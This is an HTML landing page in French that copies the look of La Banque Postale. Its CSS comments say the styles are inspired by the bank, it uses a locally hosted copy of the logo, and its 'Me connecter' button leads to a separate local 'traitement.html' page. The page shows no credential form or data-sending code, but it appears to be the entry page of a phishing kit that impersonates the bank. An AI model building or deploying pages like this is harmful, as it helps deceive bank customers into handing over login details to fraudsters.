<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>La Banque Postale - Connexion</title>
    <style>
        /* Variables CSS inspirées de La Banque Postale */
        :root {
            --lbp-blue: #005BA3;
            --lbp-light-blue: #0072CE;
            --lbp-dark-blue: #003A6F;
            --lbp-green: #78BE20;
            --lbp-white: #FFFFFF;
            --lbp-gray: #F5F5F5;
            --lbp-dark-gray: #333333;
            --lbp-text: #333333;
            --lbp-text-light: #666666;
            --lbp-border: #DDDDDD;
            --lbp-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
            --lbp-radius: 8px;
            --lbp-space-xs: 8px;
            --lbp-space-sm: 16px;
            --lbp-space-md: 24px;
            --lbp-space-lg: 32px;
            --lbp-space-xl: 48px;
        }

        /* Reset et styles de base */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
        }

        html {
            scroll-behavior: smooth;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        body {
            background-color: var(--lbp-blue);
            color: var(--lbp-white);
            line-height: 1.6;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        /* En-tête */
        .lbp-header {
            background-color: var(--lbp-blue);
            padding: var(--lbp-space-sm);
            position: sticky;
            top: 0;
            z-index: 100;
        }

        .lbp-header-container {
            max-width: 1200px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .lbp-logo {
            height: 40px;
            filter: brightness(0) invert(1);
        }

        .lbp-header-actions {
            display: flex;
            gap: var(--lbp-space-sm);
        }

        .lbp-header-link {
            color: var(--lbp-white);
            text-decoration: none;
            font-weight: 500;
            font-size: 14px;
        }

        /* Contenu principal */
        .lbp-main {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: var(--lbp-space-xl) var(--lbp-space-md);
            text-align: center;
        }

        .lbp-hero {
            max-width: 600px;
            margin: 0 auto;
            padding: var(--lbp-space-xl) 0;
        }

        .lbp-brand-logo {
            height: 80px;
            margin-bottom: var(--lbp-space-lg);
            animation: fadeIn 1s ease-out;
            filter: brightness(0) invert(1);
        }

        .lbp-hero-title {
            font-size: 28px;
            font-weight: 700;
            color: var(--lbp-white);
            margin-bottom: var(--lbp-space-md);
            line-height: 1.3;
        }

        /* Bouton de connexion */
        .lbp-connect-button {
            background-color: var(--lbp-white);
            color: var(--lbp-blue);
            border: none;
            border-radius: 50px;
            padding: var(--lbp-space-sm) var(--lbp-space-xl);
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            display: inline-flex;
            align-items: center;
            justify-content: space-between;
            gap: var(--lbp-space-xs);
            min-width: 220px;
            margin-top: var(--lbp-space-lg);
        }

        .lbp-connect-button:hover {
            background-color: #f0f0f0;
            transform: translateY(-2px);
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
        }

        .lbp-connect-button:active {
            transform: translateY(0);
        }

        .lbp-connect-button svg {
            width: 20px;
            height: 20px;
            order: 2;
        }

        .lbp-connect-button span {
            order: 1;
        }

        /* Animations */
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* Responsive */
        @media (max-width: 768px) {
            .lbp-hero-title {
                font-size: 24px;
            }
        }
    </style>
</head>
<body>
    <!-- En-tête -->
    <header class="lbp-header">
        <div class="lbp-header-container">
            <img src="lbp-logo-fond-400x440.png" alt="La Banque Postale" class="lbp-logo">
            <div class="lbp-header-actions">
                <a href="#" class="lbp-header-link">Aide</a>
                <a href="#" class="lbp-header-link">Contact</a>
            </div>
        </div>
    </header>

    <!-- Contenu principal -->
    <main class="lbp-main">
        <div class="lbp-hero">
            <img src="lbp-logo-fond-400x440.png" alt="La Banque Postale" class="lbp-brand-logo">
            <h1 class="lbp-hero-title">Bienvenue sur La Banque Postale</h1>
            <button class="lbp-connect-button" onclick="window.location.href='traitement.html'">
                <span>Me connecter</span>
                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3" />
                </svg>
            </button>
        </div>
    </main>
</body>
</html>
